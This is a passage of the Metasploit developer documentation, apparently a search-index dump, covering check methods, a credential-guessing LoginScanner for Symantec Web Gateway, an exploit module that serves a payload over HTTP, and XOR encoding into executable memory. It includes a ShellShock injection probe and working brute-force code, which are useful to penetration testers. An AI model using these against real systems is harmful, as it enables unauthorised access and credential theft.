    "title": "Check Codes",
    "content": "Once you have determined the vulnerable state, you should return a check code. Check codes are constants defined in Msf::Exploit::CheckCode, and these are the ones you can use: . | Checkcode | Description | . | Exploit::CheckCode::Unknown | Used if the module fails to retrieve enough information from the target machine, such as due to a timeout. | . | Exploit::CheckCode::Safe | Used if the check fails to trigger the vulnerability, or even detect the service. | . | Exploit::CheckCode::Detected | The target is running the service in question, but the check fails to determine whether the target is vulnerable or not. | . | Exploit::CheckCode::Appears | This is used if the vulnerability is determined based on passive reconnaissance. For example: version, banner grabbing, or simply having the resource that’s known to be vulnerable. | . | Exploit::CheckCode::Vulnerable | Only used if the check is able to actually take advantage of the bug, and obtain some sort of hard evidence. For example: for a command execution type bug, get a command output from the target system. For a directory traversal, read a file from the target, etc. Since this level of check is pretty aggressive in nature, you should not try to DoS the host as a way to prove the vulnerability. | . | Exploit::CheckCode::Unsupported | The exploit does not support the check method. If this is the case, then you don’t really have to add the check method. | . The CheckCode also supports an optional description which is printed by the framework upon completion of the check method. For example: . return CheckCode::Appears('Vulnerable component XYZ is installed') . ",
    "url": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#check-codes",
    "relUrl": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#check-codes"
  },"329": {
    "doc": "How to write a check method",
    "title": "Remote Check Example",
    "content": "Here’s an abstract example of how a Metasploit check might be written: . # # Returns a check code that indicates the vulnerable state on an app running on OS X # def check if exec_cmd_via_http(\"id\") =~ /uid=\\d+\\(.+\\)/ # Found the correct ID output, good indicating our command executed return Exploit::CheckCode::Vulnerable end http_body = get_http_body if http_body if http_body =~ /Something CMS v1\\.0/ # We are able to find the version thefore more precise about the vuln state return Exploit::CheckCode::Appears elsif http_body =~ /Something CMS/ # All we can tell the vulnerable app is running, but no more info to # determine the vuln return Exploit::CheckCode::Detected end else vprint_error(\"Unable to determine due to a HTTP connection timeout\") return Exploit::CheckCode::Unknown end Exploit::CheckCode::Safe end . Note: If you are writing an auxiliary module with the Msf::Auxiliary::Scanner mixin, you should declare your check method like this: . def check_host(ip) # Do your thing end . Local Exploit Check Example . Most local exploit checks are done by checking the version of the vulnerable file, which is considered passive, therefore they should be flagging Exploit::CheckCode::Appears. Passive local exploit checks don’t necessarily mean they are less reliable, in fact, they are not bad. But to qualify for Exploit::CheckCode::Vulnerable, your check should do the extra mile, which means either you somehow make the program return a vulnerable response, or you inspect the vulnerable code. An example of making the program return a vulnerable response is ShellShock (the following is specific for VMWare): . def check check_str = Rex::Text.rand_text_alphanumeric(5) # ensure they are vulnerable to bash env variable bug if cmd_exec(\"env x='() { :;}; echo #{check_str}' bash -c echo\").include?(check_str) &amp;&amp; cmd_exec(\"file '#{datastore['VMWARE_PATH']}'\") !~ /cannot open/ Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end end . One way to inspect the vulnerable code is to come up with a signature, and see if it exists in the vulnerable process. Here’s an example with adobe_sandbox_adobecollabsync.rb: . # 'AdobeCollabSyncTriggerSignature' =&gt; \"\\x56\\x68\\xBC\\x00\\x00\\x00\\xE8\\xF5\\xFD\\xFF\\xFF\" # 'AdobeCollabSyncTrigger' =&gt; 0x18fa0 def check_trigger signature = session.railgun.memread(@addresses['AcroRd32.exe'] + target['AdobeCollabSyncTrigger'], target['AdobeCollabSyncTriggerSignature'].length) if signature == target['AdobeCollabSyncTriggerSignature'] return true end return false end def check @addresses = {} acrord32 = session.railgun.kernel32.GetModuleHandleA(\"AcroRd32.exe\") @addresses['AcroRd32.exe'] = acrord32[\"return\"] if @addresses['AcroRd32.exe'] == 0 return Msf::Exploit::CheckCode::Unknown elsif check_trigger return Msf::Exploit::CheckCode::Vulnerable else return Msf::Exploit::CheckCode::Detected end end . Another possible way to inspect is grab the vulnerable file, and use Metasm. But of course, this is a lot slower and generates more network traffic. ",
    "url": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#remote-check-example",
    "relUrl": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html#remote-check-example"
  },"330": {
    "doc": "How to write a check method",
    "title": "How to write a check method",
    "content": "In Metasploit, exploits and auxiliary modules support the check command that allows the user to be able to determine the vulnerable state before using the module. This feature is handy for those who need to verify the vulnerability without actually popping a shell, and used to quickly identify all vulnerable, or possibly exploitable machines on the network. Although vulnerability checks aren’t the focus of Metasploit, because it isn’t a vulnerability scanner like Nexpose, we do actually encourage people to implement the check() method anyway to add more value to the module. If you do write one, make sure to keep these guidelines in mind: . ",
    "url": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-write-a-check-method.html"
  },"331": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Step 1: Set up your target environment",
    "content": "For our demonstration, we will be using Symantec Web Gateway. A trial is available at the vendor’s website. Obviously downloading/installing it would be your first step. ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-1-set-up-your-target-environment",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-1-set-up-your-target-environment"
  },"332": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Step 2: Set up a client",
    "content": "The purpose of setting up a client is to sample the login request and response. Normally you can do this with: . | A web browser plus a sniffer . | For the sniffer, you can download Wireshark, and have it running. | Use a web browser to login. | Go back to Wireshark and save the HTTP request, this is exactly what you will send in the login module. You will also need to save the HTTP response so that you can check for a successful and a failed login. | . | A browser with Burp . Burp is a tool for performing security testing of web applications. You can download the free version from the vendor’s website. In some cases, Burp is way better than a sniffer because you can modify HTTP requests, it’s also a very convenient way to capture HTTPS traffic. Here’s what you do. | Start Burp. | Configure your web browser’s proxy so Burp can forward traffic. | Use the web browser to login. | Go back to Burp, you can find the history of all the requests and responses. | . | . For our example, this is the request the browser sends to Symantec Web Gateway: . POST /spywall/login.php HTTP/1.1 Host: 192.168.1.176 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:27.0) Gecko/20100101 Firefox/27.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.1.176/spywall/login.php Cookie: PHPSESSID=otgam4mgjrl00h2esk3o2npt05 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 54 USERNAME=gooduser&amp;PASSWORD=GoodPassword&amp;loginBtn=Login . And this is the response Symantec Web Gateway returns for a successful login: . HTTP/1.1 302 Found Date: Tue, 12 May 2015 19:32:31 GMT Server: Apache X-Frame-Options: SAMEORIGIN Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Set-Cookie: PHPSESSID=vmb56vhd7740oqcmth8cqtagq5; path=/; secure; HttpOnly Location: https://192.168.1.176/spywall/executive_summary.php Content-Length: 0 Keep-Alive: timeout=15, max=5000 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 . A failed login response is an HTTP 200 with the following message in the body: . We're sorry, but the username or password you have entered is incorrect. Please retype your username and password. The username and password are case sensitive. ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-2-set-up-a-client",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-2-set-up-a-client"
  },"333": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Step 3: Start with a LoginScanner template",
    "content": "Your login module mainly consists of three components: the LoginScanner portion, the auxiliary portion, and rpsec. The actual HTTP requests and responses are handled in the LoginScanner portion, so we’ll start from there. Your most basic HTTP LoginScanner template will look like this: . require 'metasploit/framework/login_scanner/http' module Metasploit module Framework module LoginScanner class SymantecWebGateway &lt; HTTP # Attemps to login to the server. # # @param [Metasploit::Framework::Credential] credential The credential information. # @return [Result] A Result object indicating success or failure def attempt_login(credential) end end end end end . Save it under lib/metasploit/framework/login_scanner/. The #attempt_login method . The #attempt_login is called automatically. You can write your entire login code there, but it’s better to break in down into multiple methods so that the code is cleaner, and easier to document and rspec. Typically, all you want #attempt_login to do is focusing on crafting the Result object, pass it to a custom #login routine, and then return the Result object. It almost always looks something like this: . def attempt_login(credential) # Default Result result_opts = { credential: credential, status: Metasploit::Model::Login::Status::INCORRECT, proof: nil, host: host, port: port, protocol: 'tcp' } # Merge login result # credential.public is the username # credential.private is the password result_opts.merge!(do_login(credential.public, credential.private)) # Return the Result object Result.new(result_opts) end . Notice that: . | By default, our proof is nil. | The status is Metasploit::Model::Login::Status::INCORRECT. | We’re calling #do_login, which is our custom login method. | The #do_login method will have to update status and proof before we return the Result object. | . The custom login method . Ok, now let’s talk about building this #do_login method. This is where we send the same HTTP request we sampled earlier. If you’re already familiar with writing a Metasploit module that sends an HTTP request, the first thing that comes to mind is probably using the HttpClient. Well, you can’t do that at all over here, so we have to fall back to Rex::Proto::Http::Client. Fortunately for you, we made all this a little bit easier by creating another request called #send_request, here’s an example of how to use that: . send_request({'uri'=&gt;'/'}) . You will rely on this method a lot to accomplish most of what you need to do here. Ok, now, let’s move on and talk about how to use #send_request to send a login request. Remember in the login request, there is actually a PHPSESSID cookie, you should obtain this first. Usually the web application will give you the session cookie when you request the login page for the very first time, and this happens a lot. Here’s an example of how to grab PHPSESSID: . def get_session_id login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({'uri' =&gt; login_uri}) sid = res.get_cookies.scan(/(PHPSESSID=\\w+);*/).flatten[0] || '' return sid end . Now that you have a session ID, you can finally make the login request. Remember in the sample, we have to submit the username, password, loginBtn as a POST request. So let’s do that with #send_request: . protocol = ssl ? 'https' : 'http' peer = \"#{host}:#{port}\" login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({ 'uri' =&gt; login_uri, 'method' =&gt; 'POST', 'cookie' =&gt; get_session_id, 'headers' =&gt; { 'Referer' =&gt; \"#{protocol}://#{peer}/#{login_uri}\" }, 'vars_post' =&gt; { 'USERNAME' =&gt; username, 'PASSWORD' =&gt; password, 'loginBtn' =&gt; 'Login' # Found in the HTML form } }) . Now that the request is sent, we need to check the response (the res variable). Typically, you have a few choices to determine a successful login: . | Check the HTTP response code. In this case, we have a 302 (redirect), but know that sometimes the response code can lie so this should not be your first choice. | Check the HTML. With some web applications, you might get a “successful login” message, and you can regex that. This is most likely the most accurate way. | Check the location header. In our case, Symantec returns a 302 and contains no body. But it redirects us to a spywall/executive_summary.php page in the location header, so we can use that. We can also try to access executive_summary.php with a renewed session ID, and make sure we can actually see the admin interface, but requesting an extra page adds more penalty to performance, so this is up to you. | . In the end, your custom login method will probably look something like this: . def do_login(username, password) protocol = ssl ? 'https' : 'http' peer = \"#{host}:#{port}\" login_uri = normalize_uri(\"#{uri}/spywall/login.php\") res = send_request({ 'uri' =&gt; login_uri, 'method' =&gt; 'POST', 'cookie' =&gt; get_session_id, 'headers' =&gt; { 'Referer' =&gt; \"#{protocol}://#{peer}/#{login_uri}\" }, 'vars_post' =&gt; { 'USERNAME' =&gt; username, 'PASSWORD' =&gt; password, 'loginBtn' =&gt; 'Login' # Found in the HTML form } }) if res &amp;&amp; res.headers['Location'].include?('executive_summary.php') return {:status =&gt; LOGIN_STATUS::SUCCESSFUL, :proof =&gt; res.to_s} end {:proof =&gt; res.to_s} end . The exact statuses you can return are: . | Constant | Purpose | . | Metasploit::Model::Login::Status::DENIED_ACCESS | Access is denied | . | Metasploit::Model::Login::Status::DISABLED | Account is disabled | . | Metasploit::Model::Login::Status::INCORRECT | Credential is incorrect | . | Metasploit::Model::Login::Status::LOCKED_OUT | Account has been locked out | . | Metasploit::Model::Login::Status::NO_AUTH_REQUIRED | No authentication | . | Metasploit::Model::Login::Status::SUCCESSFUL | Successful login | . | Metasploit::Model::Login::Status::UNABLE_TO_CONNECT | Unable to connect to the service | . | Metasploit::Model::Login::Status::UNTRIED | Credential has not been tried | . | Metasploit::Model::Login::Status::ALL | All the above (An array) | . When you’re done, your code will look something like this: . https://github.com/rapid7/metasploit-framework/blob/master/lib/metasploit/framework/login_scanner/symantec_web_gateway.rb . ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-3-start-with-a-loginscanner-template",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-3-start-with-a-loginscanner-template"
  },"334": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Step 4: Write the auxiliary module",
    "content": "The auxiliary module acts more like an user-interface. You describe what the module does, handles options, initializes objects, and do reporting. A basic auxiliary module template in our case would be something like this: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' require 'metasploit/framework/login_scanner/symantec_web_gateway' require 'metasploit/framework/credential_collection' class MetasploitModule &lt; Msf::Auxiliary include Msf::Exploit::Remote::HttpClient include Msf::Auxiliary::AuthBrute include Msf::Auxiliary::Report include Msf::Auxiliary::Scanner def initialize(info={}) super(update_info(info, 'Name' =&gt; 'Symantec Web Gateway Login Utility', 'Description' =&gt; %q{ This module will attempt to authenticate to a Symantec Web Gateway. }, 'Author' =&gt; [ 'sinn3r' ], 'License' =&gt; MSF_LICENSE, 'DefaultOptions' =&gt; { 'RPORT' =&gt; 443, 'SSL' =&gt; true, 'SSLVersion' =&gt; 'TLS1' } )) end def run_host(ip) end end . Save it under modules/auxiliary/scanner/http/. Our main method is #run_host, so we’ll begin there. But before we do, we must initialize your LoginScanner object. The following is an example of how you will probably write it. def scanner(ip) @scanner ||= lambda { cred_collection = Metasploit::Framework::CredentialCollection.new( blank_passwords: datastore['BLANK_PASSWORDS'], pass_file: datastore['PASS_FILE'], password: datastore['PASSWORD'], user_file: datastore['USER_FILE'], userpass_file: datastore['USERPASS_FILE'], username: datastore['USERNAME'], user_as_pass: datastore['USER_AS_PASS'] ) return Metasploit::Framework::LoginScanner::SymantecWebGateway.new( configure_http_login_scanner( host: ip, port: datastore['RPORT'], cred_details: cred_collection, stop_on_success: datastore['STOP_ON_SUCCESS'], bruteforce_speed: datastore['BRUTEFORCE_SPEED'], connection_timeout: 5 )) }.call end . Notice that this scanner method can be called multiple times, but the use of lambda will allow the LoginScanner object to initialize only once. After that first time, every time the method is called, it will just return @scanner instead of going through the whole initialization process again. In some cases you might need to pass more datastore options, maybe not. For example, if you want to allow the URI to be configurable (which is also already an accessor in Metasploit::Framework::LoginScanner::HTTP), then you have to create and pass datastore[‘URI’] to configure_http_login_scanner too, like so: . uri: datastore['URI'] . And then in your LoginScanner, pass uri to #send_request: . send_request({'uri'=&gt;uri}) . At this point, the scanner method holds our Metasploit::Framework::LoginScanner::SymantecWebGateway object. If we call the #scan! method, it will trigger the #attempt_login method we wrote earlier, and then yield the Result object. Basically like this: . scanner(ip).scan! do |result| # result = Our Result object end . With the Result object, we can start reporting. In most cases, you will probably be using #create_credential_login to report a successful login. And use #invalidate_login to report a bad one. Reporting a valid credential . The credential API knows a lot about a credential, such as when it was used, how it was used, serviced tried, target IP, port, etc, etc. So when we report, that’s how much information we are storing for every credential. To make credential reporting easy to use, all you need to do is call the #store_valid_credential method like this: . store_valid_credential( user: result.credential.public, private: result.credential.private, private_type: :password, # This is optional proof: nil, # This is optional ) . Report an invalid credential . Here’s another example you can use: . # Reports a bad credential. # # @param [String] ip Target host # @param [Fixnum] port Target port # @param [Result] The Result object # @return [void] def report_bad_cred(ip, rport, result) invalidate_login( address: ip, port: rport, protocol: 'tcp', public: result.credential.public, private: result.credential.private, realm_key: result.credential.realm_key, realm_value: result.credential.realm, status: result.status, proof: result.proof ) end . At this point, you’re pretty much done with the auxiliary module. It will probably look something like this: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/symantec_web_gateway_login.rb . ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-4-write-the-auxiliary-module",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#step-4-write-the-auxiliary-module"
  },"335": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Test",
    "content": "And finally, make sure your module actually works. Test for a successful login: . msf auxiliary(symantec_web_gateway_login) &gt; run [+] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Success: 'sinn3r:GoodPassword' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) &gt; . Test for a failed login: . msf auxiliary(symantec_web_gateway_login) &gt; run [-] 192.168.1.176:443 SYMANTEC_WEB_GATEWAY - Failed: 'sinn3r:BadPass' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(symantec_web_gateway_login) &gt; . ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#test",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html#test"
  },"336": {
    "doc": "Writing a HTTP LoginScanner",
    "title": "Writing a HTTP LoginScanner",
    "content": "This is a step-by-step guide on how to write a HTTP login module using the latest LoginScanner and Credential APIs. Before we begin, it’s probably a good idea to read Creating Metasploit Framework LoginScanners, which explains about the APIs in-depth. The LoginScanner API can be found in the lib/metasploit/framework/loginscanner directory, and the Credential API can found as a metasploit-credential gem here. You will most likely want to read them while writing the login module. ",
    "url": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html",
    "relUrl": "/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html"
  },"337": {
    "doc": "How to write a module using HttpServer and HttpClient",
    "title": "How to write a module using HttpServer and HttpClient",
    "content": "Using multiple networking mixins in a Metasploit module is always a tricky thing to do, because most likely you will run into issues like overlapping datastore options, variables, methods, the super call is only meant for one mixin, etc. This is considered as advanced module development, and sometimes can be rather painful to figure out on your own. To improve the Metasploit development experience, we have a few examples to demonstrate common scenarios that require you to use multiple mixins to achieve exploitation. Today’s lesson: Send a HTTP request to attack the target machine, and use a HttpServer for payload delivery. Say you want to exploit a web server or web application. You have code execution on the box, but you need to find a way to deliver the final payload (probably an executable), and a HTTP server happens to be your option. Here is how you can set it up: . ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core' class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Remote::HttpServer::HTML def initialize(info={}) super(update_info(info, 'Name' =&gt; \"HttpClient and HttpServer Example\", 'Description' =&gt; %q{ This demonstrates how to use two mixins (HttpClient and HttpServer) at the same time, but this allows the HttpServer to terminate after a delay. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ ['URL', 'http://metasploit.com'] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Automatic', {} ], ], 'Privileged' =&gt; false, 'DisclosureDate' =&gt; \"Dec 09 2013\", 'DefaultTarget' =&gt; 0)) register_options( [ OptString.new('TARGETURI', [true, 'The path to some web application', '/']), OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10]) ], self.class) end def on_request_uri(cli, req) print_status(\"#{peer} - Payload request received: #{req.uri}\") send_response(cli, 'You get this, I own you') end def primer print_status(\"Sending a malicious request to #{target_uri.path}\") send_request_cgi({'uri'=&gt;normalize_uri(target_uri.path)}) end def exploit begin Timeout.timeout(datastore['HTTPDELAY']) { super } rescue Timeout::Error # When the server stops due to our timeout, this is raised end end end . Here’s what happens when you run the above example: . | The super call wrapped in the Timeout block will start the web server. | Before the web server is in the infinite loop state, the primer() method is called, which is where you send your malicious requests to get code execution. | Your HttpServer serves the final payload upon request. | After 10 seconds, the module raises a Timeout exception. The web server finally terminates. | . In case you’re wondering why the web server must terminate after a period of time, this is because if the module fails to gain code execution on the target machine, obviously it will never ask your web server for the malicious payload, therefore there is no point to keeping it alive forever. Typically it shouldn’t take a very long time to get a payload request, either, so we keep the timeout short. The output for the above example should look something like this: . msf exploit(test) &gt; run [*] Exploit running as background job. [*] Started reverse handler on 10.0.1.76:4444 [*] Using URL: http://0.0.0.0:8080/SUuv1qjZbCibL80 [*] Local IP: http://10.0.1.76:8080/SUuv1qjZbCibL80 [*] Server started. [*] Sending a malicious request to / msf exploit(test) &gt; [*] 10.0.1.76 test - 10.0.1.76:8181 - Payload request received: /SUuv1qjZbCibL80 [*] Server stopped. msf exploit(test) &gt; . Related Articles: . | How to Send an HTTP Request Using HTTPClient | How to write a browser exploit using HttpServer | https://community.rapid7.com/community/metasploit/blog/2012/12/17/metasploit-hooks | . ",
    "url": "/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html",
    "relUrl": "/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html"
  },"338": {
    "doc": "XOR Support",
    "title": "How to XOR with Metasploit::Framework::Compiler",
    "content": "The Metasploit C compiler has built-in support for XOR encoding and decoding, which is implemented as the xor.h header. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html#how-to-xor-with-metasploitframeworkcompiler",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html#how-to-xor-with-metasploitframeworkcompiler"
  },"339": {
    "doc": "XOR Support",
    "title": "Code Example",
    "content": "#include &lt;Windows.h&gt; #include &lt;String.h&gt; #include &lt;xor.h&gt; int main(int args, char** argv) { char* xorStr = \"NNNN\"; char xorKey = 0x0f; LPVOID lpBuf = VirtualAlloc(NULL, sizeof(int) * strlen(xorStr), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memset(lpBuf, '\\0', strlen(xorStr)); xor((char*) lpBuf, xorStr, xorKey, strlen(xorStr)); MessageBox(NULL, lpBuf, \"Test\", MB_OK); return 0; } . To compile, use Metasploit::Framework::Compiler::Windows.compile_c . ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html#code-example",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html#code-example"
  },"340": {
    "doc": "XOR Support",
    "title": "XOR Support",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html"
  },"341": {
    "doc": "Zip",
    "title": "How to zip files with Msf::Util::EXE.to_zip",
    "content": "Compressing files into zip format is very easy with Metasploit. For most purposes, you can use Msf::Util::EXE.to_zip() to compress data into a zip file. Note that the former Rex::Zip::Archive() should no longer be used. ",
    "url": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html#how-to-zip-files-with-msfutilexeto_zip",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html#how-to-zip-files-with-msfutilexeto_zip"
  },"342": {
    "doc": "Zip",
    "title": "Usage:",
    "content": "files = [ {data: 'AAAA', fname: 'test1.txt', comment: 'my comment'}, {data: 'BBBB', fname: 'test2.txt'} ] zip = Msf::Util::EXE.to_zip(files) . If saved as a file, the above example will extract to the following: . $ unzip test.zip Archive: test.zip extracting: test1.txt extracting: test2.txt . ",
    "url": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html#usage",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html#usage"
  },"343": {
    "doc": "Zip",
    "title": "Zip",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html"
  },"344": {
    "doc": "Basics",
    "title": "Basics",
    "content": " ",
    "url": "/docs/using-metasploit/basics/",
    "relUrl": "/docs/using-metasploit/basics/"
  },"345": {
    "doc": "Getting Started",
    "title": "Getting Started",
    "content": " ",
    "url": "/docs/using-metasploit/getting-started/",
    "relUrl": "/docs/using-metasploit/getting-started/"
  },"346": {
    "doc": "Meterpreter",
    "title": "Meterpreter",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/meterpreter/",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/"
  },"347": {
    "doc": "Advanced",
    "title": "Advanced",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/",
    "relUrl": "/docs/using-metasploit/advanced/"
  },"348": {
    "doc": "Oracle Support",
    "title": "Oracle Support",
    "content": " ",
    "url": "/docs/using-metasploit/other/oracle-support/",
    "relUrl": "/docs/using-metasploit/other/oracle-support/"
  },"349": {
    "doc": "Other",
    "title": "Other",
    "content": " ",
    "url": "/docs/using-metasploit/other/",
    "relUrl": "/docs/using-metasploit/other/"
  },"350": {
    "doc": "Intermediate",
    "title": "Intermediate",
    "content": " ",
    "url": "/docs/using-metasploit/intermediate/",
    "relUrl": "/docs/using-metasploit/intermediate/"
  },"351": {
    "doc": "Using Metasploit",
    "title": "Using Metasploit",
    "content": " ",
    "url": "/docs/using-metasploit/",
    "relUrl": "/docs/using-metasploit/"
  },"352": {
    "doc": "Module metadata",
    "title": "Module metadata",
    "content": " ",
    "url": "/docs/development/developing-modules/module-metadata/",
    "relUrl": "/docs/development/developing-modules/module-metadata/"
  },"353": {
    "doc": "Scanners",
    "title": "Scanners",
    "content": " ",
    "url": "/docs/development/developing-modules/guides/scanners/",
    "relUrl": "/docs/development/developing-modules/guides/scanners/"
  },"354": {
    "doc": "Guides",
    "title": "Guides",
    "content": " ",
    "url": "/docs/development/developing-modules/guides/",
    "relUrl": "/docs/development/developing-modules/guides/"
  },"355": {
    "doc": "SMB",
    "title": "SMB",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/smb/",
    "relUrl": "/docs/development/developing-modules/libraries/smb/"
  },"356": {
    "doc": "Compiling C",
    "title": "Compiling C",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/",
    "relUrl": "/docs/development/developing-modules/libraries/c/"
  },"357": {
    "doc": "HTTP",
    "title": "HTTP",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/http/",
    "relUrl": "/docs/development/developing-modules/libraries/http/"
  },"358": {
    "doc": "Deserialization",
    "title": "Deserialization",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/deserialization/",
    "relUrl": "/docs/development/developing-modules/libraries/deserialization/"
  },"359": {
    "doc": "Obfuscation",
    "title": "Obfuscation",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/"
  },"360": {
    "doc": "Libraries",
    "title": "Libraries",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/",
    "relUrl": "/docs/development/developing-modules/libraries/"
  },"361": {
    "doc": "External Modules",
    "title": "External Modules",
    "content": " ",
    "url": "/docs/development/developing-modules/external-modules/",
    "relUrl": "/docs/development/developing-modules/external-modules/"
  },"362": {
    "doc": "Developing Modules",
    "title": "Developing Modules",
    "content": " ",
    "url": "/docs/development/developing-modules/",
    "relUrl": "/docs/development/developing-modules/"
  },"363": {
    "doc": "Roadmap",
    "title": "Roadmap",
    "content": " ",
    "url": "/docs/development/roadmap/",
    "relUrl": "/docs/development/roadmap/"
  },"364": {
    "doc": "Quality",
    "title": "Quality",
    "content": " ",
    "url": "/docs/development/quality/",
    "relUrl": "/docs/development/quality/"
  },"365": {
    "doc": "Git",
    "title": "Git",
    "content": " ",
    "url": "/docs/development/get-started/git/",
    "relUrl": "/docs/development/get-started/git/"
  },"366": {
    "doc": "Get Started",
    "title": "Get Started",
    "content": " ",
    "url": "/docs/development/get-started/",
    "relUrl": "/docs/development/get-started/"
  },"367": {
    "doc": "Proposals",
    "title": "Proposals",
    "content": " ",
    "url": "/docs/development/propsals/",
    "relUrl": "/docs/development/propsals/"
  },"368": {
    "doc": "Process",
    "title": "Process",
    "content": " ",
    "url": "/docs/development/maintainers/process/",
    "relUrl": "/docs/development/maintainers/process/"
  },"369": {
    "doc": "Ruby Gems",
    "title": "Ruby Gems",
    "content": " ",
    "url": "/docs/development/maintainers/ruby-gems/",
    "relUrl": "/docs/development/maintainers/ruby-gems/"
  },"370": {
    "doc": "Maintainers",
    "title": "Maintainers",
    "content": " ",
    "url": "/docs/development/maintainers/",
    "relUrl": "/docs/development/maintainers/"
  },"371": {
    "doc": "Google Summer of Code",
    "title": "Google Summer of Code",
    "content": " ",
    "url": "/docs/development/google-summer-of-code/",
    "relUrl": "/docs/development/google-summer-of-code/"
  },"372": {
    "doc": "Development",
    "title": "Development",
    "content": " ",
    "url": "/docs/development/",
    "relUrl": "/docs/development/"
  },"373": {
    "doc": "Home",
    "title": "Getting Started",
    "content": ". | Setting Up a Metasploit Development Environment | Using Metasploit | Using Git | Reporting a Bug | Navigating and Understanding Metasploit’s Codebase | . ",
    "url": "/#getting-started",
    "relUrl": "/#getting-started"
  },"374": {
    "doc": "Home",
    "title": "Contributing",
    "content": ". | Contributing to Metasploit | Creating Metasploit Framework LoginScanners | Guidelines for Accepting Modules and Enhancements | Common Metasploit Module Coding Mistakes | Style Tips | Committer Rights | Landing Pull Requests | . ",
    "url": "/#contributing",
    "relUrl": "/#contributing"
  },"375": {
    "doc": "Home",
    "title": "Metasploit Development",
